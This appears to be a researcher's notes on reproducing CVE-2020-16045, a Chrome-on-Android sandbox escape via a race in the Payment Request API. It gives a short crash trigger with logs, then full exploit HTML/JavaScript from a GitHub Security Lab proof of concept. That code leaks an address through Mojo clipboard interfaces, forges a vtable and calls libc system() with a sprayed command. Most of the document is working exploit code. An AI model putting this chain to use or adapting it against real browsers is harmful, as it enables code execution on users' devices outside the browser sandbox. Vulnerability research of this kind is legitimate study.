# CVE-2020-16045
Chrome sandbox escape caused by a race in the Payment API.

## poc attempt 1

One poc written by [yytgravity](https://github.com/yytgravity/Daily-learning-record/tree/2361ddb3405ff9bf644255687326dd63c543f39f/cve/CVE-2020-16045)

main.html
```html
<html>
  <script>
  function remove() {
    let frame = document.getElementById("ifrm");
    frame.parentNode.removeChild(frame);
  }
  function load() {
    setTimeout(remove, 1000);
  }
  </script>
  <body onload="load()">
    <iframe id="ifrm" src="payment_request2.html"></iframe>
  </body>
</html>
```
When alone, it causes a crash logged by the Chrome gpu procces (CrGpuMain):
```
03-05 21:17:27.297 21435 21455 F libc    : Fatal signal 6 (SIGABRT), code
-6 (SI_TKILL) in tid 21455 (CrGpuMain), pid 21435 (ileged_process0)
03-05 21:17:28.531 21516 21535 F libc    : Fatal signal 6 (SIGABRT), code
-6 (SI_TKILL) in tid 21535 (CrGpuMain), pid 21516 (ileged_process1)
03-05 21:17:29.864 21579 21597 F libc    : Fatal signal 6 (SIGABRT), code
-6 (SI_TKILL) in tid 21597 (CrGpuMain), pid 21579 (ileged_process2)
03-05 21:19:06.513 21641 21661 F libc    : Fatal signal 6 (SIGABRT), code
-6 (SI_TKILL) in tid 21661 (CrGpuMain), pid 21641 (ileged_process3)
```

payment_request2.html:
```html
<html>
  <body>
  	<script>
		  var supportedInstruments = [{
			 supportedMethods: 'secure-payment-confirmation',
             data: {'credentialIds' : [new ArrayBuffer(4)], 'fallbackUrl' : 'localhost:8000', 'networkData' : new ArrayBuffer(4),
                    }
			}];

		  var details = {
		    total: {
		      label: 'Total',
		      amount: { currency: 'USD', value : '55.00' }
		    }
		  };
		  var options = {};

          for (let i = 0; i < 0x100; i++) {
      		var request = new PaymentRequest(supportedInstruments, details, options);
          }
  	</script>
  </body>
</html>
```

after implementing payment_request2.html, similar crashes are logged in the Chrome Gpu process:
```
-6 (SI_TKILL) in tid 30702 (CrGpuMain), pid 30563 (ileged_process0)
03-05 21:44:51.314 30854 30873 F libc    : Fatal signal 6 (SIGABRT), code
-6 (SI_TKILL) in tid 30873 (CrGpuMain), pid 30854 (ileged_process1)
03-05 21:45:02.591 30951 30971 F libc    : Fatal signal 6 (SIGABRT), code
-6 (SI_TKILL) in tid 30971 (CrGpuMain), pid 30951 (ileged_process2)
03-05 21:45:06.717 31120 31139 F libc    : Fatal signal 6 (SIGABRT), code
-6 (SI_TKILL) in tid 31139 (CrGpuMain), pid 31120 (ileged_process3)
```

It also sometimes logs this error:
```
1 (TRAP_BRKPT), fault addr 0x615e009e40 in tid 21909 (su), pid 21909 (su)
03-05 21:19:08.833 22017 22036 F libc    : Fatal signal 6 (SIGABRT), code
```

These don't seem to be triggered by the bug though.

## GitHub poc (attempt 2)

I am going to start using the [GitHub Security Lab poc](https://github.com/github/securitylab/tree/main/SecurityExploits/Chrome/SandboxEscape/GHSL-2020-165).

This version uses three html files served through the phone.

payment_request_clip.html
```html
<html>
  <head>
    <script src="mojo_bindings.js"></script>
    <script src="third_party/blink/public/mojom/clipboard/clipboard.mojom.js"></script>
    <script>
      //Change these to the actual value before running
      const libhwuiOffset = 0x75d8dd4000n;
      const libcOffset = 0x75d962c000n;
      //Points to Execute in libwebp, offset from libhwui
      const executeOffset = 0x7db9a0n;
      const bitWriterOffset = 0x803e30n;

      //Offset to system in libc
      const systemOffset = 0x925b0n;
 
      //The offset of GetRoutingID in rfh's vtable
      const getRoutingIDOffset = 0x48n;
      const ifrmUrl = 'payment_request_clip2.html';
      const jamUrl = 'payment_request_jam_clip.html';

      const reloadUrl = 'payment_request_clip.html';

      const command = 'touch /data/data/org.chromium.chrome/pwn';
      //Up to 32 bytes maybe written by bit writer.
      const commandOffset = 0x28;
      clipboards = [];
      dataClipboards = [];
      images = [];


	  function sleep(miliseconds) {
	    var currentTime = new Date().getTime();
	    while (currentTime + miliseconds >= new Date().getTime()) {
	    }
	  }

      function computeAddress(image1, image2) {
        let addrBuffer = new ArrayBuffer(8);
        let addrIntView = new Uint8Array(addrBuffer);
        for (let i = 8; i < 8 + 5; i++) {
          if (i != 11) {
            addrIntView[i - 8] = image1[i];
          } else {
            addrIntView[i - 8] = image2[i];
          }
        }
        let addrBigIntView = new BigUint64Array(addrBuffer);
        return addrBigIntView[0];
      }

      function createIframe(id, src) {
	    let iframe = document.createElement('iframe');
	    iframe.style.display="none";
	    iframe.setAttribute('id', id);
        if (src !== undefined) {
	      iframe.src = src;
        }
	    document.body.appendChild(iframe);
      }
       
      function removeIframe(id) {
	    let frame = document.getElementById(id);
	    frame.parentNode.removeChild(frame);
      }

      function runCommand(addr) {
        window.location = reloadUrl + '?addr=' + addr.toString();
      }

      function readClipboard() {
        clipboards[0].commitWrite();
        sleep(1000);
        clipboards[0].readImage(1).then(readImg);
        sleep(500);
        clipboards[1].commitWrite();
        sleep(1000);
        clipboards[1].readImage(1).then(readImg);
      }

      function readImg(image) {
        if (image.image === null) {
          console.log('Failed to obtain read clipboard');
          window.location = reloadUrl;
        }
        let imageData = new Uint8Array(image.image.pixelData.bytes);
        images.push(imageData);
        if (images.length == 2) {
          let addr = computeAddress(images[0], images[1]);
          if (addr < 0xffffffffn) {
            console.log('Failed to obtain address: ' + addr.toString(16));
            window.location = reloadUrl;
          }
          console.log('addr: ' + addr.toString(16));
          runCommand(addr);
        }
      }

      function readAddress(bitmap1, bitmap2) {
        createIframe('ifrm', ifrmUrl);
        createIframe('ifrm1', ifrmUrl);
        createIframe('jam', jamUrl);
        setTimeout(()=> {
          removeIframe('ifrm');
          clipboards[0].writeImage(bitmap1);
          removeIframe('ifrm1');
          clipboards[1].writeImage(bitmap2);
          dataClipboards[29].ptr.reset();
          dataClipboards[30].ptr.reset();
          setTimeout(readClipboard, 3000);
        }, 3000);
      }

      function createBitmap(alphaType, width, vtable) {
        let data = new ArrayBuffer(width * width * 4);
        if (vtable !== undefined) {
          let view = new BigUint64Array(data);
          view[0] = vtable;
        }
        let colorSpace = new Array(9);
        let imageInfo = new skia.mojom.ImageInfo();
        imageInfo.colorType = 4;
        imageInfo.alphaType = alphaType;
        imageInfo.serializedColorSpace = colorSpace;
        imageInfo.width = width;
        imageInfo.height = width;
        let bigBuffer = new mojoBase.mojom.BigBuffer();
        bigBuffer.bytes = new Uint8Array(data);
        let bitmap = new skia.mojom.Bitmap();
        bitmap.imageInfo = imageInfo;
        bitmap.rowBytes = width * 4;
        bitmap.pixelData = bigBuffer;
        return bitmap;
      }

      function createClipboards(n, clipboardArr) {
        for (let i = 0; i < n; i++) {
          let clipboard_ptr = new blink.mojom.ClipboardHostPtr();
          Mojo.bindInterface(blink.mojom.ClipboardHost.name,
                            mojo.makeRequest(clipboard_ptr).handle);
          clipboardArr.push(clipboard_ptr);
        }
      }


      function sprayCommand() {
        let dataBitmap = createBitmap(1, 16);
        let data = dataBitmap.pixelData.bytes;
        for (let i = 0; i < command.length; i++) {
          data[commandOffset + i] = command.charCodeAt(i);
        }
        for (let i = 0; i < dataClipboards.length; i++) {
          dataClipboards[i].writeImage(dataBitmap);
        }
      }

      function load() {
        let addrIdx = window.location.href.search('addr');
        if (addrIdx == -1) {
          let vtable = libhwuiOffset + bitWriterOffset - getRoutingIDOffset;
          createClipboards(2, clipboards);
          createClipboards(32, dataClipboards);
          sprayCommand();
          let bitmap1 = createBitmap(1, 32, vtable);
          let bitmap2 = createBitmap(2, 32, vtable);
          readAddress(bitmap1, bitmap2);
        } else {
          createClipboards(1, clipboards);
          sleep(2000);
          let addr = BigInt(window.location.href.substring(addrIdx + 5));
          if (addr == 0) {
            window.location = reloadUrl;
          }
          let vtable = libhwuiOffset + executeOffset - getRoutingIDOffset;
          let bitmap = createBitmap(1, 32, vtable);
          //fake WebPWorker
          let view = new BigUint64Array(bitmap.pixelData.bytes.buffer);
          view[2] = libcOffset + systemOffset;
          view[3] = addr + BigInt(commandOffset);
          createIframe('ifrm', ifrmUrl);
          createIframe('jam', jamUrl);
          setTimeout(() => {
            removeIframe('ifrm');
            clipboards[0].writeImage(bitmap);
            console.log('done');
          }, 3000);
        }
      }
  </script>
  <body onload="load()">
    <a href="payment_request_clip.html">reload</a>
  </body>
</html>
```

payment_request_clip2.html:
```html
<html>
  <body>
  	<script>
		  var supportedInstruments = [{
			 supportedMethods: 'secure-payment-confirmation',
             data: {'credentialIds' : [new ArrayBuffer(4)], 'fallbackUrl' : 'localhost:8000', 'networkData' : new ArrayBuffer(4),
                    }
			}];

		  var details = {
		    total: {
		      label: 'Total',
		      amount: { currency: 'USD', value : '55.00' }
		    }
		  };
		  var options = {};
          for (let i = 0; i < 0x1; i++) {
      		var request = new PaymentRequest(supportedInstruments, details, options);
          }
  	</script>
  </body>
</html>
```

payment_request_jam_clip.html:
```html
<html>
  <body>
  	<script>
          for (let i = 0; i < 0x800; i++) {
            PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
          }
  	</script>
  </body>
</html>
```